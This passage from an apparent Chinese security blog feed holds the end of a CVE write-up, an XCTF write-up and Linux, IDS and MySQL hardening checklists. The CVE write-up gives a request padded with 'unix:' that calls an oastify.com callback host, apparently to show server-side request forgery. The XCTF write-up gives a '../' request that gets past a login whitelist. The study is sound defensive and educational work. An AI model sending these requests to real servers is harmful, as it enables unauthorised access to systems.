/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://9mwa2r71altec4jboehesqx09rfi3lra.oastify.com/ HTTP/1.1</span><br><span class="line">Host: 123.58.224.8:31003</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="/../assets/img/image-76.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-76.png" alt="alt text"></a></p><p><a href="/../assets/img/image-77.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-77.png" alt="alt text"></a></p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 中间件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>filter设计缺陷导致的权限绕过</title>
      <link href="/2024/11/13/2024-08-29-xctf-filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
      <url>/2024/11/13/2024-08-29-xctf-filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /login.html/../flag.html HTTP/1.1 <span class="comment"># 返回到根目录下 访问flag.html </span></span><br><span class="line">Host: 61.147.171.105:63076</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: JSESSIONID=C4A50FA26043136F4272E8E4B946C2C9; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1724942854; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1724942854; HMACCOUNT=D013441DFA61A5ED</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/image-75.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-75.png" alt="alt text"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>必须要知道访问的html文件的路径</li><li>login是白名单</li><li>通过<code>../</code>可以返回到根目录下</li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XCTF </tag>
            
            <tag> 权限绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基线检查表</title>
      <link href="/2024/11/13/2024-08-12-%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%9F%A5%E8%A1%A8/"/>
      <url>/2024/11/13/2024-08-12-%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%9F%A5%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="IDS检查表"><a href="#IDS检查表" class="headerlink" title="IDS检查表"></a>IDS检查表</h1><table><thead><tr><th>分类</th><th>测评项</th><th>预期结果</th><th>评估操作示例</th><th>检查情况</th><th>结果</th><th>整改建议</th></tr></thead><tbody><tr><td>安全审计</td><td>应对网络系统中的网络设备运行状况、网络流量、用户行为等进行日志记录</td><td>日志文件包含设备运行状况、网络流量、用户行为</td><td>登录到 IDS 中，找到日志管理，任意查询日志，查看日志详情</td><td></td><td></td><td>日志需记录设备运行状况、网络流量、用户行为等，管理员可自行配置调整</td></tr><tr><td>安全审计</td><td>审计记录应包括：事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息</td><td>操作日志中应包括上述几种类型</td><td>登录到 IDS 中，找到操作日志，查看操作日志详情</td><td></td><td></td><td>根据不同的 IDS 类型，对操作日志的记录详情进行调整</td></tr><tr><td>安全审计</td><td>应能够根据记录数据进行分析，并生成审计报表</td><td>IDS 应该能够根据记录数据进行分析，生成审计报表</td><td></td><td></td><td></td><td></td></tr><tr><td>网络设备防护</td><td>应对登录网络设备的用户进行身份鉴别</td><td>每个账户都有对应的口令，不存在空口令和弱口令</td><td>用不同的账户和口令登录到系统中</td><td></td><td></td><td>每个用户都要设置口令，不能存在空口令</td></tr><tr><td>网络设备防护</td><td>应对网络设备的管理员登录地址进行限制</td><td>只有固定的 IP 地址才能以管理员的权限登录到系统中</td><td>登录到系统中&gt;系统管理&gt;管理员&gt;管理员设置中有允许登录 IP</td><td></td><td></td><td>登录到系统中&gt;系统管理&gt;管理员&gt;管理员设置中将允许登录 IP 设置为固定的 IP 地址</td></tr><tr><td>网络设备防护</td><td>主要网络设备应对同一用户选择两种或两种以上组合的鉴别技术来进行身份鉴别</td><td>采用了两种及两种以上组合鉴别技术进行身份鉴别</td><td>在登录过程中可以知道</td><td></td><td></td><td>根据实际需求，建议尽量都选用两种或两种以上的组合鉴别技术进行身份鉴别</td></tr><tr><td>网络设备防护</td><td>身份鉴别信息应具有不易被冒用的特点，口令应有复杂度要求并定期更换</td><td>口令长度至少为 10 位，包含数字，字母（大小写），特殊字符三种形式，更换周期为 90 天</td><td>登录到系统中&gt;系统管理&gt;管理员&gt;登录参数设置</td><td></td><td></td><td>建议整改为口令长度至少为 10 位，包含数字，字母（大小写），特殊字符三种形式，更换周期为 90 天</td></tr><tr><td>网络设备防护</td><td>应具有登录失败处理功能，可采取结束会话、限制非法登录次数和当网络登录连接超时自动退出等措施</td><td>限制非法登录次数为 5 次，登录超时退出时间为 300 秒</td><td>登录到系统中&gt;系统管理&gt;管理员&gt;登录参数设置</td><td></td><td></td><td>建议设置为限制非法登录次数为 5 次，登录超时退出时间为 300 秒，避免非法登录的风险</td></tr><tr><td>网络设备防护</td><td>当对网络设备进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听</td><td>应采用 SSL 加密方式对传输数据进行加密</td><td>使用 https + IP 登录到管理后台，能成功登录就是采用了 SSL</td><td></td><td></td><td>登录到系统中&gt;系统管理&gt;管理员&gt;web 访问协议设置中选择启用 https</td></tr></tbody></table><h1 id="Linux基线检查表"><a href="#Linux基线检查表" class="headerlink" title="Linux基线检查表"></a>Linux基线检查表</h1><table><thead><tr><th>分类</th><th>测评项</th><th>预期结果</th><th>评估操作示例</th><th>检查情况</th><th>结果</th><th>整改建议</th></tr></thead><tbody><tr><td>身份鉴别</td><td>应对登录操作系统和数据库系统的用户进行身份标识和鉴别</td><td>1) 操作系统使用口令鉴别机制对用户进行身份标识和鉴别；<br>2) 登录时提示输入用户名和口令；以错误口令或空口令登录时提示登录失败，验证了登录控制功能的有效性；<br>3) 操作系统不存在密码为空的用户。</td><td>cat &#x2F;etc&#x2F;passwd，cat &#x2F;etc&#x2F;shadow 查看文件中各用户名状态</td><td></td><td></td><td>操作系统和数据库每个用户都必须设置登录用户名和登录密码，不能存在空密码</td></tr><tr><td>身份鉴别</td><td>操作系统和数据库系统管理用户身份标识应具有不易被冒用的特点，口令应有复杂度要求并定期更换</td><td>密码策略如下：<br>PASS_MAX_DAYS   90（生命期最大为 90 天）<br>PASS_MIN_DAYS   0（密码最短周期 0 天）<br>PASS_MIN_LEN   10（密码最小长度 10 位）<br>PASS_WARN_AGE 7（密码到期前 7 天提醒）<br>口令复杂度：<br>口令长度 8 位以上，并包含数字、字母、特殊字符三种形式</td><td>more &#x2F;etc&#x2F;login.defs</td><td></td><td></td><td>密码最大生存周期为 90 天</td></tr><tr><td>身份鉴别</td><td></td><td></td><td>密码最短修改周期为 0 天，可以随时修改密码</td><td></td><td></td><td></td></tr><tr><td>身份鉴别</td><td></td><td></td><td>密码最小长度为 10 位，包含数字，特殊字符，字母（大小写）三种形式</td><td></td><td></td><td></td></tr><tr><td>身份鉴别</td><td></td><td></td><td>密码到期前 7 天必须提醒</td><td></td><td></td><td></td></tr><tr><td>身份鉴别</td><td>应启用登录失败处理功能，可采取结束会话、限制非法登录次数和自动退出等措施</td><td>1) 操作系统已启用登陆失败处理、结束会话、限制非法登录次数等措施；<br>2) 当超过系统规定的非法登陆次数或时间登录操作系统时，系统锁定或自动断开连接</td><td>cat &#x2F;etc&#x2F;pam.d&#x2F;system-auth，查看相应的登录设置</td><td></td><td></td><td>建议限制，密码过期后重设的密码不能和前三次的密码相同</td></tr><tr><td>身份鉴别</td><td>当对服务器进行远程管理时，应采取必要措施，防止鉴别信息在网络传输过程中被窃听</td><td>1) 操作系统使用 SSH 协议进行远程连接；<br>2) 若未使用 SSH 方式进行远程管理，则查看是否使用 telnet 方式进行远程管理；</td><td>查看是否运行 SSH：<br>cat service -status-all</td><td>grep sshd;<br>查看是否使用 telnet 方式：cat service -status -all</td><td>grep running；</td><td></td></tr><tr><td>身份鉴别</td><td>为操作系统和数据库的不同用户分配不同的用户名，确保用户名具有唯一性</td><td>用户的标识唯一，若系统允许用户名相同，UID 不同，则 UID 是唯一性标识；若系统允许 UID 相同，则用户名是唯一性标识。</td><td>cat &#x2F;etc&#x2F;passwd 文件中的用户名信息，每个信息用“：”分隔开来，每个字段对应的信息为：<br>注册名：口令（密文用 x 来代替）：UID：GID：用户名：用户主目录：命令解释程序 Shell</td><td></td><td></td><td>UID 是唯一性标识，每个用户必须采用不同的 UID 来区分</td></tr><tr><td>身份鉴别</td><td>应采用两种或两种以上组合的鉴别技术对管理用户进行身份鉴别</td><td>对管理员访谈，对于三级系统，必须使用两种或两种以上组合的鉴别技术实现用户身份鉴别，如密码和口令的组合使用。</td><td>访谈管理员</td><td></td><td></td><td>三级系统建议采用用户名密码 + 证书口令登录的方式；<br>三级以下系统可以采用一种鉴别技术。</td></tr><tr><td>访问控制</td><td>应启用访问控制功能，依据安全策略控制用户对资源的访问</td><td>root 用户：<br>passwd 文件夹只有 rw - r - r 权限<br>shadow 文件夹只有 r - - - 权限<br>r &#x3D; 4 w &#x3D; 2 x &#x3D; 1</td><td>在 root 权限下：ls - l &#x2F;etc&#x2F;passwd<br>ls - l &#x2F;etc&#x2F;shadow<br>查看用户权限。<br>- rw - r–r–：第一个 rw 表示文件所有者有读写权限；<br>第二个 r 表示与文件所有者同一组的用户只有读的权限；<br>第三个 r 表示不与文件所有者同一组的用户只有读的权限</td><td></td><td></td><td>根据实际需求，对每个用户的访问权限进行限制，对敏感的文件夹限制访问用户的权限</td></tr><tr><td>访问控制</td><td>应根据管理用户的角色分配权限，实现管理用户的权限分离，仅授予管理用户所需的最小权限；</td><td>访谈管理员，了解每个用户的作用、权限</td><td></td><td></td><td>给予账户所需最小权限，避免出现特权用户</td><td></td></tr><tr><td>访问控制</td><td>应实现操作系统和数据库系统特权用户的权限分离</td><td>操作系统和数据库的特权用户的权限必须分离，避免一些特权用户拥有过大的权限，减少人为误操作</td><td>访谈管理员</td><td></td><td></td><td>分离数据库和操作系统的特权用户，不能使一个用户权限过大</td></tr><tr><td>访问控制</td><td>应严格限制默认帐户的访问权限，重命名系统默认帐户，修改这些帐户的默认口令</td><td>默认账户已更名，或已被禁用</td><td>cat &#x2F;etc&#x2F;passwd</td><td></td><td></td><td>严格限制默认账户的访问权限，对存在的默认账户的用户名和口令进行修改。<br>使用 usermod - L 用户名，来锁定默认用户。</td></tr><tr><td>访问控制</td><td>应及时删除多余的、过期的帐户，避免共享帐户的存在</td><td>不存在多余、过期和共享账户</td><td>cat &#x2F;etc&#x2F;passwd</td><td></td><td></td><td>删除、禁用例如 uucp，ftp 等多余账户</td></tr><tr><td>安全审计</td><td>审计范围应覆盖到服务器和重要客户端上的每个操作系统用户和数据库用户</td><td>系统开启了安全审计功能或部署了第三方安全审计设备</td><td>service auditd status</td><td></td><td></td><td>开启系统本身的安全审计功能，完整记录用户对操作系统和文件访问情况，或采用第三方的安全审计设备</td></tr><tr><td>安全审计</td><td>审计内容应包括重要用户行为、系统资源的异常使用和重要系统命令的使用等系统内重要的安全相关事件</td><td>审计功能已开启，包括：用户的添加和删除、审计功能的启动和关闭、审计策略的调整、权限变更、系统资源的异常使用、重要的系统操作（如用户登录、退出）等设置</td><td>ps - ef</td><td>grep auditd</td><td></td><td></td></tr><tr><td>安全审计</td><td>审计记录应包括事件的日期、时间、类型、主体标识、客体标识和结果等</td><td>审计记录包括事件的日期、时间、类型、主体标识、客体标识和结果等内容</td><td>cat &#x2F;etc&#x2F;audit&#x2F;auditd.conf<br>cat &#x2F;etc&#x2F;audit&#x2F;audit.rules</td><td></td><td></td><td>记录事件产生的时间，日期，类型，主客体标识等</td></tr><tr><td>安全审计</td><td>操作系统应遵循最小安装的原则，仅安装需要的组件和应用程序，并通过设置升级服务器等方式保持系统补丁及时得到更新</td><td>1) 系统安装的组件和应用程序遵循了最小安装的原则；<br>2) 不必要的服务没有启动；<br>3) 不必要的端口没有打开；</td><td>service –status-all</td><td>grep running</td><td></td><td></td></tr><tr><td>资源控制</td><td>应通过设定终端接入方式、网络地址范围等条件限制终端登录</td><td>已设定终端登录安全策略及措施，非授权终端无法登录管理</td><td>&#x2F;etc&#x2F;hosts.deny、&#x2F;etc&#x2F;hosts.allow 中对终端登录限制的相关配置参数</td><td></td><td></td><td>建议配置固定的终端、特定的网络范围内才能进行终端登录</td></tr><tr><td>资源控制</td><td>应根据安全策略设置登录终端的操作超时锁定</td><td>已在&#x2F;etc&#x2F;profile 中为 TMOUT 设置了合理的操作超时时间</td><td>cat &#x2F;etc&#x2F;profile</td><td></td><td></td><td>超时时间建议设置为 300 秒</td></tr></tbody></table><h1 id="MySQL-完整检查表"><a href="#MySQL-完整检查表" class="headerlink" title="MySQL 完整检查表"></a>MySQL 完整检查表</h1><h2 id="一、身份鉴别"><a href="#一、身份鉴别" class="headerlink" title="一、身份鉴别"></a>一、身份鉴别</h2><h3 id="（一）默认账号要求"><a href="#（一）默认账号要求" class="headerlink" title="（一）默认账号要求"></a>（一）默认账号要求</h3><ul><li>预期结果：不存在默认数据库和默认帐号；不存在匿名账户；应用系统应使用新建用户，不得使用系统默认账户。</li><li>评估操作示例：<ul><li>mysql&gt; show databases;</li><li>mysql&gt; select * from user;</li><li>只保留单个管理员 root 和应用系统专用账户。</li></ul></li><li>检查情况：</li><li>结果：</li><li>整改建议：在不影响系统正常运行的情况下删除默认账号，若默认账号下有系统运行，则修改默认账号名。</li></ul><h3 id="（二）数据库系统管理用户账号名和密码要求项"><a href="#（二）数据库系统管理用户账号名和密码要求项" class="headerlink" title="（二）数据库系统管理用户账号名和密码要求项"></a>（二）数据库系统管理用户账号名和密码要求项</h3><ul><li>预期结果：修改 root 用户默认口令，删除空口令；改变默认 mysql 管理员帐号，host 为空。</li><li>评估操作示例：mysql&gt; select * from user;查看列表中 root 用户口令不为空，host 为空。</li><li>检查情况：</li><li>结果：</li><li>整改建议：修改 root 用户的默认密码，不能有空口令，MySQL 默认的账户为 root，需要新建一个账户。MySQL 账户的 Host&#x3D;%应该为空，这样来禁止远程连接。</li></ul><h3 id="（三）管理员口令策略"><a href="#（三）管理员口令策略" class="headerlink" title="（三）管理员口令策略"></a>（三）管理员口令策略</h3><ul><li>预期结果：至少 8 位，数字、字母（大小写）、特殊字符组成的不规律密码。</li><li>评估操作示例：mysql&gt;select password from user;查看密码。</li><li>检查情况：</li><li>结果：</li><li>整改建议：密码修改为 8 位以上，包含数字，字母（大小写），特殊字符三种形式。</li></ul><h3 id="（四）账号权限策略"><a href="#（四）账号权限策略" class="headerlink" title="（四）账号权限策略"></a>（四）账号权限策略</h3><ul><li>预期结果：除管理员账户之外的其他账户不得拥有系统数据库的任何权限，不得拥有 File，Grant，Reload，Shutdown，Process 等权限的任意一种。</li><li>评估操作示例：mysql&gt;show grants for root@localhost；查看 root 用户的权限。Show grants for+用户名@地址，可以查看指定账户的权限。</li><li>检查情况：</li><li>结果：</li><li>整改建议：修改除管理员外其他用户的权限，其他用户不能有 File，Grant，Reload，Shutdown，Process 等权限，不能出现其他高权限用户。</li></ul><h2 id="二、访问控制"><a href="#二、访问控制" class="headerlink" title="二、访问控制"></a>二、访问控制</h2><h3 id="（一）MySQL-运行在单独的组上"><a href="#（一）MySQL-运行在单独的组上" class="headerlink" title="（一）MySQL 运行在单独的组上"></a>（一）MySQL 运行在单独的组上</h3><ul><li>预期结果：不能在 root 账户运行 MySQL 服务器，使用普通非特权用户运行。</li><li>评估操作示例：mysql&gt;id mysql。</li><li>检查情况：</li><li>结果：</li><li>整改建议：MySQL 不能运行在 root 用户上，需新建一个专用账户给 MySQL 数据库。</li></ul><h3 id="（二）文件权限控制"><a href="#（二）文件权限控制" class="headerlink" title="（二）文件权限控制"></a>（二）文件权限控制</h3><ul><li>预期结果：MySQL 的数据目录、日志目录，以及目录下的文件属主和属组只能是 mysql 账号，不能给予其他账号任何权限。</li><li>评估操作示例：ls –la &#x2F;usr&#x2F;local&#x2F;mysql；查看数据目录所属的账号。ls –la &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;var；查看日志目录所属的账号。</li><li>检查情况：</li><li>结果：</li><li>整改建议：</li></ul><h3 id="（三）命令历史记录保护"><a href="#（三）命令历史记录保护" class="headerlink" title="（三）命令历史记录保护"></a>（三）命令历史记录保护</h3><ul><li>预期结果：mysql.history 文件中为空，没有命令历史记录。</li><li>评估操作示例：若没有修改存储历史命令的文件名，则是 mysql.history，我们执行 find &#x2F; -name mysql.history 站到文件夹所在的位置；cat 打开查看该文件内容。若修改了存储的文件名，则需要询问管理员确认存储位置。</li><li>检查情况：</li><li>结果：</li><li>整改建议：将.bash_history，.mysql_history 文件置空。ln -s &#x2F;dev&#x2F;null.bash_history；ln -s &#x2F;dev&#x2F;null.mysql_history；将历史命令缓存直接引向垃圾箱。</li></ul><h2 id="三、安全审计"><a href="#三、安全审计" class="headerlink" title="三、安全审计"></a>三、安全审计</h2><h3 id="（一）启用日志记录"><a href="#（一）启用日志记录" class="headerlink" title="（一）启用日志记录"></a>（一）启用日志记录</h3><ul><li>预期结果：启用了日志记录，记录日志信息。log-error, log, log-slow-queries 这三种日志的状态是 ON 状态。</li><li>评估操作示例：MySQL&gt;show variables like ‘log_%’;</li><li>检查情况：</li><li>结果：</li><li>整改建议：进入 my.cnf 中，在[mysqld]下面加 log-error&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;log&#x2F;error.log。log&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;log&#x2F;mysql.log。long_query_time&#x3D;2。log-slow-queries&#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;log&#x2F;slowquery.log。log-queries-not-using-indexes。</li></ul><h3 id="（二）审计记录应包括事件的日期、时间、类型、主体标识、客体标识和结果等"><a href="#（二）审计记录应包括事件的日期、时间、类型、主体标识、客体标识和结果等" class="headerlink" title="（二）审计记录应包括事件的日期、时间、类型、主体标识、客体标识和结果等"></a>（二）审计记录应包括事件的日期、时间、类型、主体标识、客体标识和结果等</h3><ul><li>预期结果：审计记录包括事件的日期、时间、类型、主体标识、客体标识和结果等内容。</li><li>评估操作示例：cat &#x2F;etc&#x2F;audit&#x2F;auditd.conf。cat &#x2F;etc&#x2F;audit&#x2F;audit.rules。</li><li>检查情况：</li><li>结果：</li><li>整改建议：首先需要开启 logbin 日志（记录数据库修改语句和生效时间），再与 init-connect 相结合，两者结合记录完整的信息。</li></ul><h3 id="（三）操作系统应遵循最小安装的原则，仅安装需要的组件和应用程序，并通过设置升级服务器等方式保持系统补丁及时得到更新"><a href="#（三）操作系统应遵循最小安装的原则，仅安装需要的组件和应用程序，并通过设置升级服务器等方式保持系统补丁及时得到更新" class="headerlink" 